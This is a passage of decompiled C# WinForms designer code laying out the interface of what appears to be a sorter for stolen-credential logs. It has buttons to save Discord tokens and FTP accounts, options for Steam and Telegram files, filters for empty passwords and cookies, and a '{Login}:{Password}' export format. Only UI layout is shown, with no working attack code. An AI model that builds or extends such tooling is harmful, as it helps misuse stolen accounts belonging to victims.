        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).TabIndex = 161;
        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Text = "Save discord tokens";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveDiscordTokensBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Click += new System.EventHandler(saveDiscordTokensBtn_Click);
        ((GuiLib.AnimaTextBox)this.f5).Dark = false;
        ((System.Windows.Forms.Control)this.f5).Location = new System.Drawing.Point(565, 557);
        ((GuiLib.AnimaTextBox)this.f5).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.f5).MultiLine = false;
        ((System.Windows.Forms.Control)this.f5).Name = "dataFormatSavingTb";
        ((GuiLib.AnimaTextBox)this.f5).Numeric = false;
        ((GuiLib.AnimaTextBox)this.f5).ReadOnly = false;
        ((System.Windows.Forms.Control)this.f5).Size = new System.Drawing.Size(206, 23);
        ((System.Windows.Forms.Control)this.f5).TabIndex = 160;
        ((GuiLib.AnimaTextBox)this.f5).Text = "{Login}:{Password}";
        ((GuiLib.AnimaTextBox)this.f5).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.f6).AutoSize = true;
        ((System.Windows.Forms.Control)this.f6).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.f6).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.f6).Location = new System.Drawing.Point(511, 560);
        ((System.Windows.Forms.Control)this.f6).Name = "label42";
        ((System.Windows.Forms.Control)this.f6).Size = new System.Drawing.Size(48, 15);
        ((System.Windows.Forms.Control)this.f6).TabIndex = 159;
        ((System.Windows.Forms.Control)this.f6).Text = "Format:";
        ((GuiLib.AnimaTextBox)this.ef).Dark = false;
        ((System.Windows.Forms.Control)this.ef).Location = new System.Drawing.Point(194, 275);
        ((GuiLib.AnimaTextBox)this.ef).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.ef).MultiLine = false;
        ((System.Windows.Forms.Control)this.ef).Name = "fileNamesToSearchTb";
        ((GuiLib.AnimaTextBox)this.ef).Numeric = false;
        ((GuiLib.AnimaTextBox)this.ef).ReadOnly = false;
        ((System.Windows.Forms.Control)this.ef).Size = new System.Drawing.Size(206, 23);
        ((System.Windows.Forms.Control)this.ef).TabIndex = 158;
        ((GuiLib.AnimaTextBox)this.ef).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.f0).AutoSize = true;
        ((System.Windows.Forms.Control)this.f0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.f0).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.f0).Location = new System.Drawing.Point(28, 278);
        ((System.Windows.Forms.Control)this.f0).Name = "label41";
        ((System.Windows.Forms.Control)this.f0).Size = new System.Drawing.Size(117, 15);
        ((System.Windows.Forms.Control)this.f0).TabIndex = 157;
        ((System.Windows.Forms.Control)this.f0).Text = "File names to search:";
        ((System.Windows.Forms.Control)this.f1).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.f1).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.f1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.f1).Location = new System.Drawing.Point(162, 444);
        ((System.Windows.Forms.Control)this.f1).Name = "steamFilesCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.f1).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).StyleManager = null;
        ((System.Windows.Forms.Control)this.f1).TabIndex = 156;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f1).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.f2).AutoSize = true;
        ((System.Windows.Forms.Control)this.f2).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.f2).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.f2).Location = new System.Drawing.Point(28, 444);
        ((System.Windows.Forms.Control)this.f2).Name = "label39";
        ((System.Windows.Forms.Control)this.f2).Size = new System.Drawing.Size(43, 15);
        ((System.Windows.Forms.Control)this.f2).TabIndex = 155;
        ((System.Windows.Forms.Control)this.f2).Text = "Steam:";
        ((System.Windows.Forms.Control)this.f3).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.f3).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.f3).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.f3).Location = new System.Drawing.Point(381, 421);
        ((System.Windows.Forms.Control)this.f3).Name = "findTgCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.f3).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).StyleManager = null;
        ((System.Windows.Forms.Control)this.f3).TabIndex = 154;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.f3).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.f4).AutoSize = true;
        ((System.Windows.Forms.Control)this.f4).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.f4).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.f4).Location = new System.Drawing.Point(198, 421);
        ((System.Windows.Forms.Control)this.f4).Name = "label37";
        ((System.Windows.Forms.Control)this.f4).Size = new System.Drawing.Size(60, 15);
        ((System.Windows.Forms.Control)this.f4).TabIndex = 153;
        ((System.Windows.Forms.Control)this.f4).Text = "Telegram:";
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.ee).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.ee).Location = new System.Drawing.Point(253, 583);
        ((System.Windows.Forms.Control)this.ee).Name = "saveFtpAccountsBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.ee).Size = new System.Drawing.Size(147, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).StyleManager = null;
        ((System.Windows.Forms.Control)this.ee).TabIndex = 152;
        ((System.Windows.Forms.Control)this.ee).Text = "Save all ftps";
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.ee).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.ee).Click += new System.EventHandler(ee_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.e8).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.e8).Location = new System.Drawing.Point(253, 554);
        ((System.Windows.Forms.Control)this.e8).Name = "removeCheckedLogsBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.e8).Size = new System.Drawing.Size(147, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).StyleManager = null;
        ((System.Windows.Forms.Control)this.e8).TabIndex = 151;
        ((System.Windows.Forms.Control)this.e8).Text = "Remove checked logs";
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.e8).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.e8).Click += new System.EventHandler(e8_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.e9).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.e9).Location = new System.Drawing.Point(253, 525);
        ((System.Windows.Forms.Control)this.e9).Name = "removeEmptyLogsBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.e9).Size = new System.Drawing.Size(147, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).StyleManager = null;
        ((System.Windows.Forms.Control)this.e9).TabIndex = 150;
        ((System.Windows.Forms.Control)this.e9).Text = "Remove empty logs";
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.e9).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.e9).Click += new System.EventHandler(e9_Click);
        ((System.Windows.Forms.DateTimePicker)this.d6).Format = System.Windows.Forms.DateTimePickerFormat.Custom;
        ((System.Windows.Forms.Control)this.d6).Location = new System.Drawing.Point(143, 498);
        ((System.Windows.Forms.Control)this.d6).Name = "logDateToDTP";
        ((System.Windows.Forms.Control)this.d6).Size = new System.Drawing.Size(257, 20);
        ((System.Windows.Forms.Control)this.d6).TabIndex = 145;
        ((System.Windows.Forms.DateTimePicker)this.d6).Value = new System.DateTime(2020, 9, 24, 23, 59, 59, 0);
        ((System.Windows.Forms.DateTimePicker)this.d5).Format = System.Windows.Forms.DateTimePickerFormat.Custom;
        ((System.Windows.Forms.Control)this.d5).Location = new System.Drawing.Point(143, 472);
        ((System.Windows.Forms.Control)this.d5).Name = "logDateFromDTP";
        ((System.Windows.Forms.Control)this.d5).Size = new System.Drawing.Size(257, 20);
        ((System.Windows.Forms.Control)this.d5).TabIndex = 144;
        ((System.Windows.Forms.DateTimePicker)this.d5).Value = new System.DateTime(2020, 9, 24, 23, 59, 59, 0);
        ((System.Windows.Forms.Control)this.be).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.be).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.be).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.be).Location = new System.Drawing.Point(162, 327);
        ((System.Windows.Forms.Control)this.be).Name = "singleSkipCheckedSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.be).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).StyleManager = null;
        ((System.Windows.Forms.Control)this.be).TabIndex = 143;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.be).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.bf).AutoSize = true;
        ((System.Windows.Forms.Control)this.bf).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.bf).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.bf).Location = new System.Drawing.Point(28, 327);
        ((System.Windows.Forms.Control)this.bf).Name = "label35";
        ((System.Windows.Forms.Control)this.bf).Size = new System.Drawing.Size(79, 15);
        ((System.Windows.Forms.Control)this.bf).TabIndex = 142;
        ((System.Windows.Forms.Control)this.bf).Text = "Skip checked:";
        ((System.Windows.Forms.Control)this.ea).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.ea).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.ea).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.ea).Location = new System.Drawing.Point(162, 420);
        ((System.Windows.Forms.Control)this.ea).Name = "singleRefreshDomainDetectSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.ea).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).StyleManager = null;
        ((System.Windows.Forms.Control)this.ea).TabIndex = 141;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ea).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.eb).AutoSize = true;
        ((System.Windows.Forms.Control)this.eb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.eb).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.eb).Location = new System.Drawing.Point(28, 420);
        ((System.Windows.Forms.Control)this.eb).Name = "label32";
        ((System.Windows.Forms.Control)this.eb).Size = new System.Drawing.Size(129, 15);
        ((System.Windows.Forms.Control)this.eb).TabIndex = 140;
        ((System.Windows.Forms.Control)this.eb).Text = "Refresh domain detect:";
        ((System.Windows.Forms.Control)this.b8).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.b8).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.b8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.b8).Location = new System.Drawing.Point(162, 351);
        ((System.Windows.Forms.Control)this.b8).Name = "singleSkipPasswordsSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.b8).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).StyleManager = null;
        ((System.Windows.Forms.Control)this.b8).TabIndex = 139;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b8).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.b9).AutoSize = true;
        ((System.Windows.Forms.Control)this.b9).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.b9).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.b9).Location = new System.Drawing.Point(28, 351);
        ((System.Windows.Forms.Control)this.b9).Name = "label28";
        ((System.Windows.Forms.Control)this.b9).Size = new System.Drawing.Size(127, 15);
        ((System.Windows.Forms.Control)this.b9).TabIndex = 138;
        ((System.Windows.Forms.Control)this.b9).Text = "Skip empty passwords:";
        ((System.Windows.Forms.Control)this.ba).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.ba).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.ba).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.ba).Location = new System.Drawing.Point(381, 327);
        ((System.Windows.Forms.Control)this.ba).Name = "singleSkipCookiesSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.ba).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).StyleManager = null;
        ((System.Windows.Forms.Control)this.ba).TabIndex = 137;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.ba).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.bb).AutoSize = true;
        ((System.Windows.Forms.Control)this.bb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.bb).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.bb).Location = new System.Drawing.Point(197, 327);
        ((System.Windows.Forms.Control)this.bb).Name = "label31";
        ((System.Windows.Forms.Control)this.bb).Size = new System.Drawing.Size(112, 15);
        ((System.Windows.Forms.Control)this.bb).TabIndex = 136;
        ((System.Windows.Forms.Control)this.bb).Text = "Skip empty cookies:";
        ((System.Windows.Forms.Control)this.m_b1).Location = new System.Drawing.Point(478, 299);
        ((System.Windows.Forms.Control)this.m_b1).Name = "metroSetDivider14";
        ((MetroSet_UI.Controls.MetroSetDivider)this.m_b1).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.m_b1).Size = new System.Drawing.Size(682, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.m_b1).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.m_b1).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_b1).TabIndex = 135;
        ((System.Windows.Forms.Control)this.m_b1).Text = "metroSetDivider14";
        ((MetroSet_UI.Controls.MetroSetDivider)this.m_b1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.m_b1).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.m_b1).Thickness = 1;
        ((System.Windows.Forms.Control)this.m_ab).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_ab).Location = new System.Drawing.Point(927, 313);
        ((System.Windows.Forms.Control)this.m_ab).Name = "currentSaveAccountsDomainLbl";
        ((System.Windows.Forms.Control)this.m_ab).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ab).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ab).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_ab).TabIndex = 134;
        ((System.Windows.Forms.Control)this.m_ab).Text = "None";
        ((System.Windows.Forms.Label)this.m_ab).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ab).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ab).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.m_ac).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_ac).Location = new System.Drawing.Point(807, 313);
        ((System.Windows.Forms.Control)this.m_ac).Name = "metroSetLabel5";
        ((System.Windows.Forms.Control)this.m_ac).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ac).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ac).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_ac).TabIndex = 133;
        ((System.Windows.Forms.Control)this.m_ac).Text = "Current domain:";
        ((System.Windows.Forms.Label)this.m_ac).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ac).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_ac).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
